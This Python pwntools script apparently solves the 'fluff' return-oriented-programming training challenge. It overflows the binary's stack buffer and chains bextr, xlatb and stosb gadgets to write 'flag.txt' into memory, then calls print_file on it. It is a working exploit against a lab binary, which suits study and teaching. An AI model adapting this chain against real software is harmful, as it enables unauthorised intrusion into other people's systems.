import pwn
import time
import sys

elf = pwn.context.binary = pwn.ELF('./fluff')
io = elf.process()

pwn.gdb.attach(io)

time.sleep(3)
#Important registers
rdiByte = pwn.p64(0x400639) #stosb byte ptr [rdi], al; ret
rdxByte = pwn.p64(0x40062a) #pop rdx, pop rcx, add rcx, 0x3ef2;
                            #bextr rbx, rcx, rdx; ret

xlat = pwn.p64(0x400628)    #xlatb; ret
retAddr = pwn.p64(0x400295) #ret
text = b'flag.txt'
printAddr = pwn.p64(elf.plt['print_file'])
charAddr = []
charAddr.append(next(elf.search(b'f')))
charAddr.append(next(elf.search(b'l')))
charAddr.append(next(elf.search(b'a')))
charAddr.append(next(elf.search(b'g')))
charAddr.append(next(elf.search(b'.')))
charAddr.append(next(elf.search(b't')))
charAddr.append(next(elf.search(b'x')))
charAddr.append(next(elf.search(b't')))
charAddr.append(next(elf.search(b'\x00')))
popRDIAddr = pwn.p64(0x4006a3)
memAddr = (0x601040);

io.recv(1000)
payload = b"".join(
    [
        b'A'*40,
        retAddr,
        #put flag.txt into rbx 
        rdxByte,
        pwn.p64(0x4000),
        pwn.p64(charAddr[0]-0xb-0x3ef2),
        xlat,
        popRDIAddr,
        pwn.p64(memAddr),
        rdiByte,

        rdxByte,
        pwn.p64(0x4000),
        pwn.p64(charAddr[1]-0x66-0x3ef2),
        xlat,
        popRDIAddr,
        pwn.p64(memAddr+1),
        rdiByte,

        rdxByte,
        pwn.p64(0x4000),
        pwn.p64(charAddr[2]-0x6c-0x3ef2),
        xlat,
        popRDIAddr,
        pwn.p64(memAddr+2),
        rdiByte,

        rdxByte,
        pwn.p64(0x4000),
        pwn.p64(charAddr[3]-0x61-0x3ef2),
        xlat,
        popRDIAddr,
        pwn.p64(memAddr+3),
        rdiByte,

        rdxByte,
        pwn.p64(0x4000),
        pwn.p64(charAddr[4]-0x67-0x3ef2),
        xlat,
        popRDIAddr,
        pwn.p64(memAddr+4),
        rdiByte,

        rdxByte,
        pwn.p64(0x4000),
        pwn.p64(charAddr[5]-0x2e-0x3ef2),
        xlat,
        popRDIAddr,
        pwn.p64(memAddr+5),
        rdiByte,
    
        rdxByte,
        pwn.p64(0x4000),
        pwn.p64(charAddr[6]-0x74-0x3ef2),
        xlat,
        popRDIAddr,
        pwn.p64(memAddr+6),
        rdiByte,
 
        rdxByte,
        pwn.p64(0x4000),
        pwn.p64(charAddr[7]-0x78-0x3ef2),
        xlat,
        rdiByte,

        popRDIAddr,
        pwn.p64(memAddr),
        retAddr,
        printAddr
    ]
)
io.sendline(payload)
io.interactive()

